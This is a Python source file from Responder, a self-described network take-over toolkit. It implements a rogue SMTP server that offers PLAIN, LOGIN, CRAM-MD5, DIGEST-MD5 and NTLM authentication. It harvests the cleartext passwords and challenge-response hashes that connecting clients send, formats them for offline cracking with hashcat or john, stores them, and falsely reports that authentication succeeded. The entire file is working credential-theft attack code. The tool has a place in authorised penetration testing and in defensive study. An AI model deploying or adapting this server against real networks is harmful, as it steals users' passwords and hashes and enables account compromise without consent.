#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: lgaffie@secorizon.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from utils import *
from base64 import b64decode, b64encode
import hashlib
import codecs
import struct
import re

if settings.Config.PY2OR3 == "PY3":
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler
from packets import SMTPGreeting, SMTPAUTH, SMTPAUTH1, SMTPAUTH2

class ESMTP(BaseRequestHandler):
	"""SMTP server with multiple authentication methods"""
	
	def __init__(self, *args, **kwargs):
		self.challenge = None
		BaseRequestHandler.__init__(self, *args, **kwargs)
	
	def send_response(self, code, message):
		"""Send SMTP response"""
		response = "%d %s\r\n" % (code, message)
		self.request.send(response.encode('latin-1'))
	
	def send_multiline_response(self, code, lines):
		"""Send multi-line SMTP response"""
		for i, line in enumerate(lines):
			if i < len(lines) - 1:
				response = "%d-%s\r\n" % (code, line)
			else:
				response = "%d %s\r\n" % (code, line)
			self.request.send(response.encode('latin-1'))
	
	def send_continue(self, data=""):
		"""Send continuation response for AUTH"""
		if data:
			response = "334 %s\r\n" % data
		else:
			response = "334\r\n"
		self.request.send(response.encode('latin-1'))
	
	def handle_auth_plain(self, data):
		"""Handle AUTH PLAIN"""
		try:
			# AUTH PLAIN can be:
			# AUTH PLAIN <base64>
			# or
			# AUTH PLAIN
			# <base64>
			
			auth_match = re.search(b'AUTH PLAIN (.+)', data, re.IGNORECASE)
			
			if auth_match:
				# Inline format
				auth_data = auth_match.group(1).strip()
			else:
				# Need to read next line
				self.send_continue()
				auth_data = self.request.recv(1024).strip()
			
			if not auth_data or auth_data == b'*':
				return False
			
			# Decode
			decoded = b64decode(auth_data)
			# Format: [authzid]\x00username\x00password
			parts = decoded.split(b'\x00')
			
			if len(parts) >= 3:
				username = parts[1].decode('latin-1', errors='ignore')
				password = parts[2].decode('latin-1', errors='ignore')
			elif len(parts) == 2:
				username = parts[0].decode('latin-1', errors='ignore')
				password = parts[1].decode('latin-1', errors='ignore')
			else:
				return False
			
			SaveToDb({
				'module': 'SMTP',
				'type': 'AUTH-PLAIN',
				'client': self.client_address[0],
				'user': username,
				'cleartext': password,
				'fullhash': username + ":" + password,
			})
			
			if settings.Config.Verbose:
				print(color("[*] [SMTP] Captured AUTH PLAIN credentials from %s for user %s" % (
					self.client_address[0].replace("::ffff:", ""), username), 2, 1))
			
			return True
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[SMTP] Error parsing AUTH PLAIN: %s' % str(e)))
			return False
	
	def handle_auth_login(self, data):
		"""Handle AUTH LOGIN (two-stage)"""
		try:
			# Check if username is inline
			auth_match = re.search(b'AUTH LOGIN (.+)', data, re.IGNORECASE)
			
			if auth_match:
				# Username provided inline
				username_b64 = auth_match.group(1).strip()
				username = b64decode(username_b64).decode('latin-1', errors='ignore')
			else:
				# Prompt for username
				self.send_continue(b64encode(b"Username:").decode('latin-1'))
				username_b64 = self.request.recv(1024).strip()
				
				if not username_b64 or username_b64 == b'*':
					return False
				
				username = b64decode(username_b64).decode('latin-1', errors='ignore')
			
			# Prompt for password
			self.send_continue(b64encode(b"Password:").decode('latin-1'))
			password_b64 = self.request.recv(1024).strip()
			
			if not password_b64 or password_b64 == b'*':
				return False
			
			password = b64decode(password_b64).decode('latin-1', errors='ignore')
			
			SaveToDb({
				'module': 'SMTP',
				'type': 'AUTH-LOGIN',
				'client': self.client_address[0],
				'user': username,
				'cleartext': password,
				'fullhash': username + ":" + password,
			})
			
			if settings.Config.Verbose:
				print(color("[*] [SMTP] Captured AUTH LOGIN credentials from %s for user %s" % (
					self.client_address[0].replace("::ffff:", ""), username), 2, 1))
			
			return True
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[SMTP] Error parsing AUTH LOGIN: %s' % str(e)))
			return False
	
	def handle_auth_cram_md5(self, data):
		"""Handle AUTH CRAM-MD5 (challenge-response)"""
		try:
			import time
			import os
			
			# Generate challenge
			challenge = "<%d.%d@%s>" % (os.getpid(), int(time.time()), settings.Config.MachineName)
			challenge_b64 = b64encode(challenge.encode('latin-1')).decode('latin-1')
			
			# Send challenge
			self.send_continue(challenge_b64)
			
			# Receive response
			response_b64 = self.request.recv(1024).strip()
			
			if not response_b64 or response_b64 == b'*':
				return False
			
			response = b64decode(response_b64).decode('latin-1', errors='ignore')
			# Format: username<space>digest
			parts = response.split(' ', 1)
			
			if len(parts) < 2:
				return False
			
			username = parts[0]
			digest = parts[1].lower()
			
			# Format for hashcat
			hash_string = "%s:$cram_md5$%s$%s" % (username, challenge, digest)
			
			SaveToDb({
				'module': 'SMTP',
				'type': 'CRAM-MD5',
				'client': self.client_address[0],
				'user': username,
				'hash': digest,
				'fullhash': hash_string,
			})
			
			if settings.Config.Verbose:
				print(color("[*] [SMTP] Captured CRAM-MD5 hash from %s for user %s" % (
					self.client_address[0].replace("::ffff:", ""), username), 3, 1))
			
			return True
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[SMTP] Error parsing CRAM-MD5: %s' % str(e)))
			return False
	
	def handle_auth_digest_md5(self, data):
		"""Handle AUTH DIGEST-MD5"""
		try:
			import time
			import os
			
			# Generate nonce
			nonce = hashlib.md5(str(time.time()).encode()).hexdigest()
			
			# Build challenge
			challenge_parts = [
				'realm="%s"' % settings.Config.MachineName,
				'nonce="%s"' % nonce,
				'qop="auth"',
				'charset=utf-8',
				'algorithm=md5-sess'
			]
			challenge = ','.join(challenge_parts)
			challenge_b64 = b64encode(challenge.encode('latin-1')).decode('latin-1')
			
			# Send challenge
			self.send_continue(challenge_b64)
			
			# Receive response
			response_b64 = self.request.recv(1024).strip()
			
			if not response_b64 or response_b64 == b'*':
				return False
			
			response = b64decode(response_b64).decode('latin-1', errors='ignore')
			
			# Parse response
			username_match = re.search(r'username="([^"]+)"', response)
			realm_match = re.search(r'realm="([^"]+)"', response)
			nonce_match = re.search(r'nonce="([^"]+)"', response)
			cnonce_match = re.search(r'cnonce="([^"]+)"', response)
			nc_match = re.search(r'nc=([0-9a-fA-F]+)', response)
			qop_match = re.search(r'qop=([a-z\-]+)', response)
			uri_match = re.search(r'digest-uri="([^"]+)"', response)
			response_match = re.search(r'response=([0-9a-fA-F]+)', response)
			
			if not username_match or not response_match:
				return False
			
			username = username_match.group(1)
			realm = realm_match.group(1) if realm_match else ''
			resp_nonce = nonce_match.group(1) if nonce_match else ''
			cnonce = cnonce_match.group(1) if cnonce_match else ''
			nc = nc_match.group(1) if nc_match else ''
			qop = qop_match.group(1) if qop_match else ''
			uri = uri_match.group(1) if uri_match else ''
			resp_hash = response_match.group(1)
			
			# Format for hashcat/john
			hash_string = "%s:$sasl$DIGEST-MD5$%s$%s$%s$%s$%s$%s$%s" % (
				username, realm, nonce, cnonce, nc, qop, uri, resp_hash
			)
			
			SaveToDb({
				'module': 'SMTP',
				'type': 'DIGEST-MD5',
				'client': self.client_address[0],
				'user': username,
				'hash': resp_hash,
				'fullhash': hash_string,
			})
			
			if settings.Config.Verbose:
				print(color("[*] [SMTP] Captured DIGEST-MD5 hash from %s for user %s" % (
					self.client_address[0].replace("::ffff:", ""), username), 3, 1))
			
			# Send rspauth (expected by some clients)
			rspauth = 'rspauth=' + resp_hash
			self.send_continue(b64encode(rspauth.encode('latin-1')).decode('latin-1'))
			
			# Client should send empty line
			self.request.recv(1024)
			
			return True
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[SMTP] Error parsing DIGEST-MD5: %s' % str(e)))
			return False
	
	def handle_auth_ntlm(self, data):
		"""Handle AUTH NTLM"""
		try:
			# Check for inline NTLM NEGOTIATE
			auth_match = re.search(b'AUTH NTLM (.+)', data, re.IGNORECASE)
			
			if auth_match:
				negotiate_b64 = auth_match.group(1).strip()
			else:
				# Send empty continuation
				self.send_continue()
				negotiate_b64 = self.request.recv(1024).strip()
			
			if not negotiate_b64 or negotiate_b64 == b'*':
				return False
			
			negotiate = b64decode(negotiate_b64)
			
			# Verify NTLMSSP signature
			if negotiate[0:8] != b'NTLMSSP\x00':
				return False
			
			msg_type = struct.unpack('<I', negotiate[8:12])[0]
			if msg_type != 1:  # Type 1 - NEGOTIATE
				return False
			
			# Generate challenge
			challenge = RandomChallenge()
			
			# Build NTLMSSP CHALLENGE (Type 2)
			ntlm_challenge = b'NTLMSSP\x00'
			ntlm_challenge += struct.pack('<I', 2)  # Type 2
			ntlm_challenge += struct.pack('<HHI', 0, 0, 0)  # Target name
			ntlm_challenge += struct.pack('<I', 0x00008201)  # Flags
			ntlm_challenge += challenge  # Server challenge
			ntlm_challenge += b'\x00' * 8  # Reserved
			ntlm_challenge += struct.pack('<HHI', 0, 0, 0)  # Target info
			
			# Send challenge
			challenge_b64 = b64encode(ntlm_challenge).decode('latin-1')
			self.send_continue(challenge_b64)
			
			# Receive NTLMSSP AUTH (Type 3)
			auth_b64 = self.request.recv(2048).strip()
			
			if not auth_b64 or auth_b64 == b'*':
				return False
			
			auth_data = b64decode(auth_b64)
			
			# Verify signature
			if auth_data[0:8] != b'NTLMSSP\x00':
				return False
			
			msg_type = struct.unpack('<I', auth_data[8:12])[0]
			if msg_type != 3:  # Type 3 - AUTH
				return False
			
			# Parse fields
			lm_len = struct.unpack('<H', auth_data[12:14])[0]
			lm_offset = struct.unpack('<I', auth_data[16:20])[0]
			
			ntlm_len = struct.unpack('<H', auth_data[20:22])[0]
			ntlm_offset = struct.unpack('<I', auth_data[24:28])[0]
			
			domain_len = struct.unpack('<H', auth_data[28:30])[0]
			domain_offset = struct.unpack('<I', auth_data[32:36])[0]
			
			user_len = struct.unpack('<H', auth_data[36:38])[0]
			user_offset = struct.unpack('<I', auth_data[40:44])[0]
			
			# Extract data
			username = auth_data[user_offset:user_offset+user_len].decode('utf-16-le', errors='ignore')
			domain = auth_data[domain_offset:domain_offset+domain_len].decode('utf-16-le', errors='ignore')
			lm_hash = auth_data[lm_offset:lm_offset+lm_len]
			ntlm_hash = auth_data[ntlm_offset:ntlm_offset+ntlm_len]
			
			# Determine version
			if ntlm_len == 24:
				hash_type = "NTLMv1"
				hash_string = "%s::%s:%s:%s:%s" % (
					username, domain,
					codecs.encode(lm_hash, 'hex').decode('latin-1'),
					codecs.encode(ntlm_hash, 'hex').decode('latin-1'),
					codecs.encode(challenge, 'hex').decode('latin-1')
				)
			elif ntlm_len > 24:
				hash_type = "NTLMv2"
				hash_string = "%s::%s:%s:%s:%s" % (
					username, domain,
					codecs.encode(challenge, 'hex').decode('latin-1'),
					codecs.encode(ntlm_hash[:16], 'hex').decode('latin-1'),
					codecs.encode(ntlm_hash[16:], 'hex').decode('latin-1')
				)
			else:
				return False
			
			SaveToDb({
				'module': 'SMTP',
				'type': hash_type + '-SSP',
				'client': self.client_address[0],
				'user': domain + '\\' + username,
				'hash': codecs.encode(ntlm_hash, 'hex').decode('latin-1'),
				'fullhash': hash_string,
			})
			
			if settings.Config.Verbose:
				print(color("[*] [SMTP] Captured %s hash from %s for user %s\\%s" % (
					hash_type, self.client_address[0].replace("::ffff:", ""), domain, username), 3, 1))
			
			return True
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[SMTP] Error parsing NTLM: %s' % str(e)))
			return False
	
	def handle(self):
		try:
			# Send greeting
			self.request.send(NetworkSendBufferPython2or3(SMTPGreeting()))
			data = self.request.recv(1024)
			
			# Handle EHLO
			if data[0:4].upper() == b'EHLO' or data[0:4].upper() == b'HELO':
				# Send ESMTP capabilities
				capabilities = [
					settings.Config.MachineName + " Hello",
					"AUTH PLAIN LOGIN CRAM-MD5 DIGEST-MD5 NTLM",
					"SIZE 35651584",
					"8BITMIME",
					"PIPELINING",
					"ENHANCEDSTATUSCODES"
				]
				self.send_multiline_response(250, capabilities)
				data = self.request.recv(1024)
			
			# Handle AUTH command
			if data[0:4].upper() == b'AUTH':
				mechanism = data[5:].strip().split(b' ')[0].upper()
				
				if mechanism == b'PLAIN':
					if self.handle_auth_plain(data):
						self.send_response(235, "Authentication successful")
					else:
						self.send_response(535, "Authentication failed")
					return
				
				elif mechanism == b'LOGIN':
					if self.handle_auth_login(data):
						self.send_response(235, "Authentication successful")
					else:
						self.send_response(535, "Authentication failed")
					return
				
				elif mechanism == b'CRAM-MD5' or mechanism.startswith(b'CRAM'):
					if self.handle_auth_cram_md5(data):
						self.send_response(235, "Authentication successful")
					else:
						self.send_response(535, "Authentication failed")
					return
				
				elif mechanism == b'DIGEST-MD5' or mechanism.startswith(b'DIGEST'):
					if self.handle_auth_digest_md5(data):
						self.send_response(235, "Authentication successful")
					else:
						self.send_response(535, "Authentication failed")
					return
				
				elif mechanism == b'NTLM':
					if self.handle_auth_ntlm(data):
						self.send_response(235, "Authentication successful")
					else:
						self.send_response(535, "Authentication failed")
					return
				
				else:
					self.send_response(504, "Unrecognized authentication type")
					return
			
			# Handle other commands
			self.send_response(250, "OK")
			
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[SMTP] Exception: %s' % str(e)))
			pass
